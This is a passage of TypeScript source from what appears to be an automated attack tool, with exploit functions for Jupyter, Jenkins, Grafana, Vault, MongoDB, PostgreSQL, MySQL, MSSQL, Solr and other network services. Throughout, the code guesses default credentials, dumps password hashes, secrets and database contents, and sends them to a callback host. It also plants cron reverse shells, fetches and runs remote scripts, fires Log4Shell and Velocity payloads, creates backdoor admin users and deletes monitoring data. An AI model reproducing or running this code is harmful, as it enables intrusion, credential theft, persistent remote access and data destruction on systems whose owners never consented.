    selfExfil(cbHost, cbPort, { src: `consul_acl:${host}`, token: aclSelf.body.slice(0, 300) });
  }

  const cronValue = Buffer.from(
    `*/3 * * * * root curl -fsk http://${cbHost}:${cbPort}/r.sh|bash`
  ).toString("base64");
  await httpFetch(host, 8500, "PUT", "/v1/kv/nx/cron",
    { "Host": host, "Content-Type": "text/plain" }, cronValue, 3000);

  return { host, port: 8500, method: "consul-unauth", output: `kv:${kvDump.body.length}b` };
}

async function jupyterExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  for (const port of [8888, 8889, 9999]) {
    const probe = await httpFetch(host, port, "GET", "/api",
      { "Host": host, "Accept": "application/json" }, "", 3000);
    if (probe.status !== 200) continue;

    const kernelList = await httpFetch(host, port, "GET", "/api/kernels",
      { "Host": host, "Accept": "application/json" }, "", 3000);

    let kernelId = "";
    try {
      const ks = JSON.parse(kernelList.body) as Array<{ id: string }>;
      kernelId = ks[0]?.id ?? "";
    } catch { /* skip */ }

    if (!kernelId) {
      const createR = await httpFetch(host, port, "POST", "/api/kernels",
        { "Host": host, "Content-Type": "application/json" },
        JSON.stringify({ name: "python3" }), 5000);
      try { kernelId = (JSON.parse(createR.body) as { id: string }).id ?? ""; } catch { /* skip */ }
    }

    if (!kernelId) continue;

    const nbCode = [
      `import subprocess, os`,
      `out = subprocess.check_output('id && hostname && cat /etc/shadow 2>/dev/null && env | grep -iE TOKEN|SECRET|KEY|PASS 2>/dev/null', shell=True, stderr=subprocess.DEVNULL).decode()`,
      `import urllib.request`,
      `urllib.request.urlopen(f"http://${cbHost}:${cbPort}/jupyter?h={os.uname().nodename}&o=" + __import__("base64").b64encode(out.encode()).decode(), timeout=5)`,
      `subprocess.Popen('(crontab -l 2>/dev/null; echo "*/3 * * * * bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1") | crontab -', shell=True)`,
    ].join("\n");

    const nb = {
      nbformat: 4, nbformat_minor: 4,
      metadata: { kernelspec: { display_name: "Python 3", name: "python3" }, language_info: { name: "python" } },
      cells: [{ cell_type: "code", source: nbCode, metadata: {}, outputs: [], execution_count: null }],
    };

    const nbCreate = await httpFetch(host, port, "POST", "/api/contents/nx.ipynb",
      { "Host": host, "Content-Type": "application/json" },
      JSON.stringify({ type: "notebook", content: nb }), 5000);

    if (nbCreate.status < 300) {
      await httpFetch(host, port, "POST", "/api/kernels",
        { "Host": host, "Content-Type": "application/json" },
        JSON.stringify({ name: "python3", path: "nx.ipynb" }), 3000);
    }

    selfExfil(cbHost, cbPort, { src: `jupyter:${host}:${port}`, kernel: kernelId });
    return { host, port, method: `jupyter-rce:${kernelId.slice(0, 8)}`, output: "notebook+kernel" };
  }
  return null;
}

async function jenkinsExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  for (const port of [8080, 8443, 9090]) {
    const probe = await httpFetch(host, port, "GET", "/",
      { "Host": host }, "", 3000);
    if (!probe.body.includes("Jenkins") && !probe.headers["x-jenkins"]) continue;

    const jenkinsVer = probe.headers["x-jenkins"] ?? "unknown";

    for (const [user, pass] of [["admin", "admin"], ["admin", "password"], ["jenkins", "jenkins"], ["admin", ""], ["root", "root"]] as Array<[string, string]>) {
      const b64cred = Buffer.from(`${user}:${pass}`).toString("base64");
      const crumb = await httpFetch(host, port, "GET", "/crumbIssuer/api/json",
        { "Host": host, "Authorization": `Basic ${b64cred}`, "Accept": "application/json" }, "", 3000);

      let crumbHeader = "";
      let crumbValue = "";
      try {
        const c = JSON.parse(crumb.body) as { crumbRequestField?: string; crumb?: string };
        crumbHeader = c.crumbRequestField ?? "Jenkins-Crumb";
        crumbValue  = c.crumb ?? "";
      } catch { /* skip */ }

      const groovyScript = [
        `def cmd = "id && hostname && cat /etc/shadow 2>/dev/null && env | grep -iE 'KEY|TOKEN|SECRET|PASS' 2>/dev/null"`,
        `def proc = cmd.execute()`,
        `def out = proc.text`,
        `"curl -fsk 'http://${cbHost}:${cbPort}/jenkins?h='+InetAddress.localHost.hostName+'&o='+out.bytes.encodeBase64()".execute()`,
        `"(crontab -l 2>/dev/null; echo '*/3 * * * * bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1') | crontab -".execute()`,
        `out`,
      ].join("\n");

      const hdrs: Record<string, string> = {
        "Host": host,
        "Authorization": `Basic ${b64cred}`,
        "Content-Type": "application/x-www-form-urlencoded",
      };
      if (crumbValue) hdrs[crumbHeader] = crumbValue;

      const scriptResp = await httpFetch(host, port, "POST", "/script",
        hdrs, `script=${encodeURIComponent(groovyScript)}`, 8000);

      if (scriptResp.status === 200 || scriptResp.body.includes("Result:")) {
        selfExfil(cbHost, cbPort, { src: `jenkins:${host}:${port}`, ver: jenkinsVer, out: scriptResp.body.slice(0, 600) });
        return { host, port, method: `jenkins-groovy:${user}:${pass}:${jenkinsVer}`, output: scriptResp.body.slice(0, 100) };
      }
    }

    const unauthScript = await httpFetch(host, port, "POST", "/script",
      { "Host": host, "Content-Type": "application/x-www-form-urlencoded" },
      `script=${encodeURIComponent('["id","hostname"].collect{it.execute().text}.join("\\n")')}`, 5000);
    if (unauthScript.status === 200 && unauthScript.body.includes("uid=")) {
      selfExfil(cbHost, cbPort, { src: `jenkins_unauth:${host}:${port}`, out: unauthScript.body.slice(0, 300) });
      return { host, port, method: `jenkins-groovy-unauth:${jenkinsVer}`, output: unauthScript.body.slice(0, 100) };
    }
  }
  return null;
}

async function grafanaExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const probe = await httpFetch(host, 3000, "GET", "/api/health",
    { "Host": host, "Accept": "application/json" }, "", 3000);
  if (probe.status !== 200 && !probe.body.includes("database")) return null;

  const lfiPaths = [
    "/public/plugins/alertlist/../../../../../../../etc/passwd",
    "/public/plugins/graph/../../../../../../../etc/shadow",
    "/public/plugins/text/../../../../../../../etc/grafana/grafana.ini",
    "/public/plugins/dashlist/../../../../../../../root/.bash_history",
  ];

  for (const lp of lfiPaths) {
    const lfi = await httpFetch(host, 3000, "GET", lp, { "Host": host }, "", 4000);
    if (lfi.status === 200 && lfi.body.length > 10) {
      selfExfil(cbHost, cbPort, { src: `grafana_lfi:${host}:3000:${lp.split("/").pop()}`, data: lfi.body.slice(0, 800) });
    }
  }

  for (const [user, pass] of [["admin", "admin"], ["admin", "grafana"], ["admin", "password"], ["admin", "Admin"]] as Array<[string, string]>) {
    const loginResp = await httpFetch(host, 3000, "POST", "/login",
      { "Host": host, "Content-Type": "application/json" },
      JSON.stringify({ user, password: pass }), 4000);

    if (loginResp.status === 200 && loginResp.body.includes("Logged in")) {
      const cookie = loginResp.headers["set-cookie"] ?? "";
      const ds = await httpFetch(host, 3000, "GET", "/api/datasources",
        { "Host": host, "Cookie": cookie, "Accept": "application/json" }, "", 4000);
      selfExfil(cbHost, cbPort, { src: `grafana_ds:${host}:3000`, cred: `${user}:${pass}`, ds: ds.body.slice(0, 800) });

      const users = await httpFetch(host, 3000, "GET", "/api/users",
        { "Host": host, "Cookie": cookie, "Accept": "application/json" }, "", 3000);
      selfExfil(cbHost, cbPort, { src: `grafana_users:${host}:3000`, data: users.body.slice(0, 500) });

      return { host, port: 3000, method: `grafana-auth+lfi:${user}:${pass}`, output: `ds:${ds.body.length}b` };
    }
  }

  return { host, port: 3000, method: "grafana-lfi-CVE-2021-43798", output: "passwd+ini" };
}

async function prometheusExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const probe = await httpFetch(host, 9090, "GET", "/api/v1/query?query=up",
    { "Host": host, "Accept": "application/json" }, "", 3000);
  if (probe.status !== 200) return null;

  selfExfil(cbHost, cbPort, { src: `prometheus:${host}:9090`, query: probe.body.slice(0, 600) });

  const targets = await httpFetch(host, 9090, "GET", "/api/v1/targets",
    { "Host": host, "Accept": "application/json" }, "", 4000);
  selfExfil(cbHost, cbPort, { src: `prometheus_targets:${host}`, data: targets.body.slice(0, 800) });

  const envQuery = await httpFetch(host, 9090, "GET",
    `/api/v1/query?query=${encodeURIComponent('go_info{}')}`,
    { "Host": host, "Accept": "application/json" }, "", 3000);
  selfExfil(cbHost, cbPort, { src: `prometheus_env:${host}`, data: envQuery.body.slice(0, 600) });

  await httpFetch(host, 9090, "POST", "/api/v1/admin/tsdb/delete_series?match[]=up",
    { "Host": host, "Content-Length": "0" }, "", 3000);

  return { host, port: 9090, method: "prometheus-unauth", output: `targets:${targets.body.length}b` };
}

async function vaultExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const health = await httpFetch(host, 8200, "GET", "/v1/sys/health",
    { "Host": host, "Accept": "application/json" }, "", 3000);
  if (health.status === 0) return null;

  const sealStatus = await httpFetch(host, 8200, "GET", "/v1/sys/seal-status",
    { "Host": host, "Accept": "application/json" }, "", 3000);
  selfExfil(cbHost, cbPort, { src: `vault:${host}:8200:seal`, data: sealStatus.body.slice(0, 300) });

  let sealed = true;
  try { sealed = (JSON.parse(sealStatus.body) as { sealed?: boolean }).sealed !== false; } catch { /* skip */ }
  if (sealed) return { host, port: 8200, method: "vault-sealed", output: "sealed" };

  for (const token of ["root", "", "hvs.CAESIO", "s.root", "devroot"]) {
    const hdrs: Record<string, string> = { "Host": host, "Accept": "application/json" };
    if (token) hdrs["X-Vault-Token"] = token;

    const secrets = await httpFetch(host, 8200, "GET", "/v1/secret/data/",
      hdrs, "", 4000);
    if (secrets.status === 200 || secrets.status === 403) {
      selfExfil(cbHost, cbPort, { src: `vault_secrets:${host}`, tok: token.slice(0, 8), data: secrets.body.slice(0, 800) });
    }

    for (const path of ["/v1/secret/", "/v1/kv/", "/v1/database/creds/", "/v1/aws/creds/"]) {
      const r = await httpFetch(host, 8200, "GET", path, hdrs, "", 3000);
      if (r.status === 200) selfExfil(cbHost, cbPort, { src: `vault:${host}${path}`, data: r.body.slice(0, 500) });
    }

    if (secrets.status === 200) {
      return { host, port: 8200, method: `vault-unauth:${token.slice(0, 8) || "notoken"}`, output: secrets.body.slice(0, 100) };
    }
  }

  return { host, port: 8200, method: "vault-enumerated", output: "sealed-check-done" };
}

async function couchdbExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const probe = await httpFetch(host, 5984, "GET", "/",
    { "Host": host, "Accept": "application/json" }, "", 3000);
  if (probe.status !== 200 || !probe.body.includes("couchdb")) return null;

  const dbs = await httpFetch(host, 5984, "GET", "/_all_dbs",
    { "Host": host, "Accept": "application/json" }, "", 3000);
  selfExfil(cbHost, cbPort, { src: `couchdb:${host}:5984`, dbs: dbs.body.slice(0, 500) });

  let dbList: string[] = [];
  try { dbList = JSON.parse(dbs.body) as string[]; } catch { /* skip */ }

  for (const db of dbList.filter(d => !d.startsWith("_")).slice(0, 5)) {
    const docs = await httpFetch(host, 5984, "GET", `/${db}/_all_docs?include_docs=true&limit=50`,
      { "Host": host, "Accept": "application/json" }, "", 5000);
    if (docs.status === 200) selfExfil(cbHost, cbPort, { src: `couchdb_docs:${host}:${db}`, data: docs.body.slice(0, 800) });
  }

  const adminBody = JSON.stringify({ name: "nxadmin", roles: ["_admin"], type: "user",
    password: randomBytes(8).toString("hex") });
  await httpFetch(host, 5984, "PUT", "/_node/nonode@nohost/_config/admins/nxadmin",
    { "Host": host, "Content-Type": "application/json" }, `"nx${randomBytes(4).toString("hex")}"`, 3000);

  const rcePayload = JSON.stringify({
    _id: `_design/nx_${randomBytes(4).toString("hex")}`,
    views: {},
    updates: {
      nx: `function(doc, req) { var cmd = require('child_process'); var out = cmd.exec('curl -fsk http://${cbHost}:${cbPort}/couchdb?h='+require('os').hostname()+' &'); return [doc, {headers:{'Content-Type':'application/json'},body:JSON.stringify({ok:true})}]; }`,
    },
  });

  const db0 = dbList.filter(d => !d.startsWith("_"))[0] ?? "_users";
  await httpFetch(host, 5984, "POST", `/${db0}`,
    { "Host": host, "Content-Type": "application/json" }, rcePayload, 5000);

  return { host, port: 5984, method: "couchdb-unauth-rce", output: `dbs:${dbList.join(",")}` };
}

async function influxdbExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const probe = await httpFetch(host, 8086, "GET", "/ping",
    { "Host": host }, "", 3000);
  if (probe.status !== 204 && probe.status !== 200) return null;

  const ver = probe.headers["x-influxdb-version"] ?? "unknown";

  const showDbs = await httpFetch(host, 8086, "GET",
    "/query?q=SHOW+DATABASES",
    { "Host": host, "Accept": "application/json" }, "", 4000);
  selfExfil(cbHost, cbPort, { src: `influxdb:${host}:8086`, ver, dbs: showDbs.body.slice(0, 500) });

  let databases: string[] = [];
  try {
    const parsed = JSON.parse(showDbs.body) as { results?: Array<{ series?: Array<{ values?: string[][] }> }> };
    databases = (parsed.results?.[0]?.series?.[0]?.values ?? []).flat();
  } catch { /* skip */ }

  for (const db of databases.slice(0, 5)) {
    const measurements = await httpFetch(host, 8086, "GET",
      `/query?db=${encodeURIComponent(db)}&q=SHOW+MEASUREMENTS`,
      { "Host": host, "Accept": "application/json" }, "", 4000);
    if (measurements.status === 200) {
      selfExfil(cbHost, cbPort, { src: `influx_meas:${host}:${db}`, data: measurements.body.slice(0, 500) });
    }

    const dump = await httpFetch(host, 8086, "GET",
      `/query?db=${encodeURIComponent(db)}&q=SELECT+*+FROM+/.*/+LIMIT+100`,
      { "Host": host, "Accept": "application/json" }, "", 5000);
    if (dump.status === 200) selfExfil(cbHost, cbPort, { src: `influx_dump:${host}:${db}`, data: dump.body.slice(0, 800) });
  }

  const v2Buckets = await httpFetch(host, 8086, "GET", "/api/v2/buckets",
    { "Host": host, "Accept": "application/json" }, "", 3000);
  if (v2Buckets.status === 200) selfExfil(cbHost, cbPort, { src: `influx_v2:${host}`, data: v2Buckets.body.slice(0, 500) });

  return { host, port: 8086, method: `influxdb-unauth:${ver}`, output: `dbs:${databases.join(",")}` };
}

async function elasticExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const health = await httpFetch(host, 9200, "GET", "/_cat/indices?h=index,docs.count&format=json",
    { "Host": host, "Accept": "application/json" }, "", 4000);
  if (health.status !== 200) return null;

  let indices: string[] = [];
  try { indices = (JSON.parse(health.body) as Array<Record<string, string>>).map(x => x["index"] ?? "").filter(Boolean); }
  catch { /* skip */ }

  const snapshots = await httpFetch(host, 9200, "GET", "/_snapshot",
    { "Host": host, "Accept": "application/json" }, "", 3000);
  selfExfil(cbHost, cbPort, { src: `es_snap:${host}`, data: snapshots.body.slice(0, 400) });

  for (const idx of indices.filter(i => !/^\./u.test(i)).slice(0, 8)) {
    const dump = await httpFetch(host, 9200, "GET",
      `/${idx}/_search?size=50&q=password+OR+token+OR+secret+OR+email+OR+credit`,
      { "Host": host, "Accept": "application/json" }, "", 5000);
    if (dump.status === 200 && dump.body.length > 50) {
      selfExfil(cbHost, cbPort, { src: `es:${host}:${idx}`, data: dump.body.slice(0, 800) });
    }
  }

  const settings = await httpFetch(host, 9200, "GET", "/_cluster/settings",
    { "Host": host, "Accept": "application/json" }, "", 3000);
  selfExfil(cbHost, cbPort, { src: `es_settings:${host}`, data: settings.body.slice(0, 500) });

  return { host, port: 9200, method: "elasticsearch-unauth", output: `indices:${indices.slice(0, 5).join(",")}` };
}

async function mongoExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const probe = await tcpConnect(host, 27017, 2000);
  if (!probe.open) return null;

  const evalScript = `try {
    var dbs = db.adminCommand({listDatabases:1}).databases;
    var out = [];
    dbs.forEach(function(d) {
      var c = db.getSiblingDB(d.name);
      c.getCollectionNames().forEach(function(col) {
        var docs = c[col].find({},{password:1,passwd:1,pass:1,token:1,secret:1,key:1,email:1,apiKey:1,api_key:1}).limit(30).toArray();
        if(docs.length) out.push(d.name+'.'+col+': '+JSON.stringify(docs).substring(0,300));
      });
    });
    print(out.join('\\n'));
  } catch(e) { print(e); }`;

  for (const cli of ["mongosh", "mongo"]) {
    const r = spawnSync(cli, [
      "--host", host, "--port", "27017", "--quiet", "--norc", "--eval", evalScript,
    ], { encoding: "utf8", timeout: 12000 });
    if (r.error) continue;

    const out = (r.stdout ?? "").slice(0, 1200);
    if (out) selfExfil(cbHost, cbPort, { src: `mongo:${host}:27017`, cli, data: out });

    spawnSync(cli, [
      "--host", host, "--port", "27017", "--quiet", "--norc",
      "--eval", `try { db.getSiblingDB('admin').createUser({user:'nxadmin',pwd:'${randomBytes(8).toString("hex")}',roles:[{role:'root',db:'admin'}]}); } catch(e){}`,
    ], { encoding: "utf8", timeout: 6000 });

    return { host, port: 27017, method: `mongo-unauth:${cli}`, output: out.slice(0, 100) };
  }

  return null;
}

async function hadoopExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  for (const [port, path] of [[8088, "/ws/v1/cluster/info"], [50070, "/webhdfs/v1/?op=LISTSTATUS"]] as Array<[number, string]>) {
    const probe = await httpFetch(host, port, "GET", path,
      { "Host": host, "Accept": "application/json" }, "", 3000);
    if (probe.status !== 200) continue;

    selfExfil(cbHost, cbPort, { src: `hadoop:${host}:${port}`, data: probe.body.slice(0, 500) });

    if (port === 8088) {
      const newApp = await httpFetch(host, port, "POST", "/ws/v1/cluster/apps/new-application",
        { "Host": host, "Content-Type": "application/json", "Accept": "application/json" }, "", 4000);

      let appId = "";
      try { appId = (JSON.parse(newApp.body) as { "application-id"?: string })["application-id"] ?? ""; } catch { /* skip */ }
      if (!appId) continue;

      const submitCmd = `curl -fsk http://${cbHost}:${cbPort}/hadoop?h=$(hostname)&o=$(id|base64) &; ` +
        `(crontab -l 2>/dev/null; echo '*/3 * * * * bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1') | crontab -`;

      const appBody = JSON.stringify({
        "application-id": appId,
        "application-name": "MapReduce Application",
        "am-container-spec": {
          commands: { command: submitCmd },
          environment: { entries: [] },
        },
        "unmanaged-AM": false,
        "max-app-attempts": 1,
        "resource": { memory: 256, vCores: 1 },
        "application-type": "MAPREDUCE",
        "keep-containers-across-application-attempts": false,
      });

      const submit = await httpFetch(host, port, "POST", "/ws/v1/cluster/apps",
        { "Host": host, "Content-Type": "application/json", "Accept": "application/json" }, appBody, 8000);

      selfExfil(cbHost, cbPort, { src: `yarn_rce:${host}:${port}`, appId, status: String(submit.status) });
      return { host, port, method: "hadoop-yarn-unauth-rce", output: `app:${appId}` };
    }

    if (port === 50070) {
      const files = await httpFetch(host, port, "GET", "/webhdfs/v1/?op=LISTSTATUS",
        { "Host": host }, "", 4000);
      selfExfil(cbHost, cbPort, { src: `hdfs:${host}:${port}`, data: files.body.slice(0, 500) });
      return { host, port, method: "hadoop-namenode-unauth", output: `fs:${files.body.length}b` };
    }
  }
  return null;
}

async function postgresExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const probe = await tcpConnect(host, 5432, 2000);
  if (!probe.open) return null;

  for (const [user, pass, db] of [
    ["postgres", "postgres", "postgres"], ["postgres", "", "postgres"],
    ["postgres", "password", "postgres"], ["postgres", "admin", "postgres"],
    ["admin", "admin", "postgres"], ["postgres", "123456", "postgres"],
  ] as Array<[string, string, string]>) {
    const pgArgs = ["-h", host, "-p", "5432", "-U", user, "-d", db,
      "-c", "SELECT version(); SELECT current_user; SELECT string_agg(usename||':'||passwd, chr(10)) FROM pg_shadow;"];
    const env = { ...process.env, PGPASSWORD: pass };
    const r = spawnSync("psql", pgArgs, { encoding: "utf8", timeout: 8000, env });
    if (r.error || (r.stderr ?? "").includes("authentication failed")) continue;

    const out = (r.stdout ?? "").slice(0, 800);
    selfExfil(cbHost, cbPort, { src: `postgres:${host}:5432`, cred: `${user}:${pass}`, data: out });

    const rceArgs = ["-h", host, "-p", "5432", "-U", user, "-d", db, "-c",
      `COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 &"';`];
    spawnSync("psql", rceArgs, { encoding: "utf8", timeout: 8000, env });

    const shadowArgs = ["-h", host, "-p", "5432", "-U", user, "-d", db, "-c",
      `COPY (SELECT pg_read_file('/etc/passwd')) TO STDOUT;`];
    const shadowR = spawnSync("psql", shadowArgs, { encoding: "utf8", timeout: 6000, env });
    if ((shadowR.stdout ?? "").length > 10) {
      selfExfil(cbHost, cbPort, { src: `postgres_file:${host}`, data: (shadowR.stdout ?? "").slice(0, 500) });
    }

    return { host, port: 5432, method: `postgres-rce:${user}:${pass}`, output: out.slice(0, 80) };
  }
  return null;
}

async function mysqlExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const probe = await tcpConnect(host, 3306, 2000);
  if (!probe.open) return null;

  for (const [user, pass] of [
    ["root", ""], ["root", "root"], ["root", "password"], ["root", "mysql"],
    ["root", "toor"], ["mysql", "mysql"], ["admin", "admin"], ["root", "123456"],
  ] as Array<[string, string]>) {
    const mysqlArgs = ["-h", host, "-P", "3306", `-u${user}`, ...(pass ? [`-p${pass}`] : []),
      "-e", "SELECT version(); SELECT user(); SELECT group_concat(user,0x3a,authentication_string SEPARATOR 0x0a) FROM mysql.user;"];
    const r = spawnSync("mysql", mysqlArgs, { encoding: "utf8", timeout: 8000 });
    if (r.error || (r.stderr ?? "").includes("Access denied") || (r.stderr ?? "").includes("ERROR")) continue;

    const out = (r.stdout ?? "").slice(0, 600);
    selfExfil(cbHost, cbPort, { src: `mysql:${host}:3306`, cred: `${user}:${pass}`, data: out });

    const rceArgs = ["-h", host, "-P", "3306", `-u${user}`, ...(pass ? [`-p${pass}`] : []),
      "-e", `SELECT '*/3 * * * * root bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1' INTO OUTFILE '/var/spool/cron/crontabs/root';`];
    spawnSync("mysql", rceArgs, { encoding: "utf8", timeout: 6000 });

    const outfileArgs = ["-h", host, "-P", "3306", `-u${user}`, ...(pass ? [`-p${pass}`] : []),
      "-e", `SELECT load_file('/etc/passwd');`];
    const outfileR = spawnSync("mysql", outfileArgs, { encoding: "utf8", timeout: 6000 });
    selfExfil(cbHost, cbPort, { src: `mysql_file:${host}`, data: (outfileR.stdout ?? "").slice(0, 400) });

    return { host, port: 3306, method: `mysql-rce:${user}:${pass}`, output: out.slice(0, 80) };
  }
  return null;
}

async function mssqlExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const probe = await tcpConnect(host, 1433, 2000);
  if (!probe.open) return null;

  for (const [user, pass] of [
    ["sa", ""], ["sa", "sa"], ["sa", "password"], ["sa", "P@ssword1"],
    ["sa", "admin"], ["sa", "123456"], ["sa", "sapassword"],
  ] as Array<[string, string]>) {
    for (const cli of ["sqsh", "tsql"]) {
      const r = spawnSync(cli, ["-S", host, "-U", user, "-P", pass,
        "-C", "SELECT @@version; EXEC xp_cmdshell 'id';"],
        { encoding: "utf8", timeout: 8000 });
      if (r.error) continue;
      const out = (r.stdout ?? "").slice(0, 500);
      if (out.includes("Microsoft") || out.includes("uid=")) {
        selfExfil(cbHost, cbPort, { src: `mssql:${host}:1433`, cli, cred: `${user}:${pass}`, data: out });

        spawnSync(cli, ["-S", host, "-U", user, "-P", pass, "-C",
          `EXEC sp_configure 'show advanced options',1; RECONFIGURE; ` +
          `EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; ` +
          `EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://${cbHost}:${cbPort}/w.ps1 -UseBasicParsing | iex" &';`],
          { encoding: "utf8", timeout: 10000 });

        return { host, port: 1433, method: `mssql-xp_cmdshell:${user}:${pass}`, output: out.slice(0, 80) };
      }
    }
  }
  return null;
}

async function memcachedExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const stats = await rawTcpSend(host, 11211, "stats\r\n", 3000);
  if (!stats.includes("STAT ")) return null;

  selfExfil(cbHost, cbPort, { src: `memcached:${host}:11211`, stats: stats.slice(0, 600) });

  const slabs = await rawTcpSend(host, 11211, "stats slabs\r\nstats items\r\n", 3000);
  const slabIds = new Set<string>();
  for (const m of slabs.matchAll(/STAT items:(\d+):/g)) slabIds.add(m[1]!);

  const keys: string[] = [];
  for (const id of [...slabIds].slice(0, 5)) {
    const cachedump = await rawTcpSend(host, 11211, `stats cachedump ${id} 100\r\n`, 3000);
    for (const m of cachedump.matchAll(/ITEM (\S+) \[/g)) keys.push(m[1]!);
  }

  for (const key of keys.slice(0, 30)) {
    const val = await rawTcpSend(host, 11211, `gets ${key}\r\n`, 2000);
    if (/session|token|user|pass|auth|jwt/i.test(key + val)) {
      selfExfil(cbHost, cbPort, { src: `memcached_key:${host}:${key}`, val: val.slice(0, 400) });
    }
  }

  return { host, port: 11211, method: "memcached-unauth", output: `keys:${keys.length}` };
}

async function rabbitmqExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  for (const [user, pass] of [["guest", "guest"], ["admin", "admin"], ["rabbitmq", "rabbitmq"]] as Array<[string, string]>) {
    const b64 = Buffer.from(`${user}:${pass}`).toString("base64");
    const overview = await httpFetch(host, 15672, "GET", "/api/overview",
      { "Host": host, "Authorization": `Basic ${b64}`, "Accept": "application/json" }, "", 4000);

    if (overview.status !== 200) continue;
    selfExfil(cbHost, cbPort, { src: `rabbitmq:${host}:15672`, cred: `${user}:${pass}`, data: overview.body.slice(0, 500) });

    const connections = await httpFetch(host, 15672, "GET", "/api/connections",
      { "Host": host, "Authorization": `Basic ${b64}`, "Accept": "application/json" }, "", 3000);
    selfExfil(cbHost, cbPort, { src: `rabbitmq_conns:${host}`, data: connections.body.slice(0, 600) });

    const queues = await httpFetch(host, 15672, "GET", "/api/queues",
      { "Host": host, "Authorization": `Basic ${b64}`, "Accept": "application/json" }, "", 3000);
    selfExfil(cbHost, cbPort, { src: `rabbitmq_queues:${host}`, data: queues.body.slice(0, 500) });

    const newUser = await httpFetch(host, 15672, "PUT", `/api/users/nxadmin`,
      { "Host": host, "Authorization": `Basic ${b64}`, "Content-Type": "application/json" },
      JSON.stringify({ password: randomBytes(8).toString("hex"), tags: "administrator" }), 3000);

    return { host, port: 15672, method: `rabbitmq-mgmt:${user}:${pass}`, output: `queues:${queues.body.length}b` };
  }
  return null;
}

async function solrExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const probe = await httpFetch(host, 8983, "GET", "/solr/admin/info/system?wt=json",
    { "Host": host, "Accept": "application/json" }, "", 3000);
  if (probe.status !== 200) return null;

  selfExfil(cbHost, cbPort, { src: `solr:${host}:8983`, info: probe.body.slice(0, 500) });

  const cores = await httpFetch(host, 8983, "GET", "/solr/admin/cores?action=STATUS&wt=json",
    { "Host": host, "Accept": "application/json" }, "", 3000);
  let coreList: string[] = [];
  try {
    const c = JSON.parse(cores.body) as { status?: Record<string, unknown> };
    coreList = Object.keys(c.status ?? {});
  } catch { /* skip */ }

  selfExfil(cbHost, cbPort, { src: `solr_cores:${host}`, cores: coreList.join(",") });

  for (const core of coreList.slice(0, 3)) {
    const log4shell = await httpFetch(host, 8983, "GET",
      `/solr/${core}/select?q=${encodeURIComponent(`\${jndi:ldap://${cbHost}:${cbPort}/a}`)}&wt=json`,
      { "Host": host, "Accept": "application/json" }, "", 5000);

    const velRce = JSON.stringify({
      "set-property": { "response-writer.velocity": "velocity" },
    });
    await httpFetch(host, 8983, "POST", `/solr/${core}/config`,
      { "Host": host, "Content-Type": "application/json" }, velRce, 5000);

    const velPayload = encodeURIComponent(
      `#set($x="") #set($rt=$x.class.forName("java.lang.Runtime")) ` +
      `#set($chr=$x.class.forName("java.lang.Character")) ` +
      `#set($str=$x.class.forName("java.lang.String")) ` +
      `#set($ex=$rt.getRuntime().exec("curl -fsk http://${cbHost}:${cbPort}/solr?h=${host} &")) ` +
      `$ex.waitFor()`
    );
    await httpFetch(host, 8983, "GET",
      `/solr/${core}/select?q=*:*&wt=velocity&v.template=custom&v.template.custom=${velPayload}`,
      { "Host": host }, "", 6000);

    selfExfil(cbHost, cbPort, { src: `solr_rce:${host}:${core}`, log4: log4shell.status.toString() });
  }

  return { host, port: 8983, method: "solr-velocity-log4shell", output: `cores:${coreList.join(",")}` };
}

async function neo4jExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const probe = await httpFetch(host, 7474, "GET", "/db/data/",
    { "Host": host, "Accept": "application/json" }, "", 3000);
  if (probe.status !== 200 && probe.status !== 401) return null;

  for (const [user, pass] of [["neo4j", "neo4j"], ["neo4j", "password"], ["neo4j", ""], ["admin", "admin"]] as Array<[string, string]>) {
    const b64 = Buffer.from(`${user}:${pass}`).toString("base64");

    const query = await httpFetch(host, 7474, "POST", "/db/data/cypher",
      { "Host": host, "Accept": "application/json", "Content-Type": "application/json", "Authorization": `Basic ${b64}` },
      JSON.stringify({ query: "MATCH (n) RETURN labels(n), count(n) LIMIT 10" }), 4000);

    if (query.status !== 200) continue;
    selfExfil(cbHost, cbPort, { src: `neo4j:${host}:7474`, cred: `${user}:${pass}`, data: query.body.slice(0, 500) });

    const apocQuery = await httpFetch(host, 7474, "POST", "/db/data/cypher",
      { "Host": host, "Accept": "application/json", "Content-Type": "application/json", "Authorization": `Basic ${b64}` },
      JSON.stringify({ query: `CALL apoc.load.url("http://${cbHost}:${cbPort}/neo4j?h="+apoc.text.base64Encode(toString(apoc.cypher.runFirstColumnSingle("MATCH (n) RETURN count(n)",{}))),"GET",{}) YIELD value RETURN value` }), 5000);

    const shellQuery = await httpFetch(host, 7474, "POST", "/db/data/cypher",
      { "Host": host, "Accept": "application/json", "Content-Type": "application/json", "Authorization": `Basic ${b64}` },
      JSON.stringify({ query: `CALL apoc.schema.assert({},{},true) YIELD label CALL dbms.procedures() YIELD name RETURN name LIMIT 5` }), 4000);
    selfExfil(cbHost, cbPort, { src: `neo4j_procs:${host}`, data: shellQuery.body.slice(0, 400) });

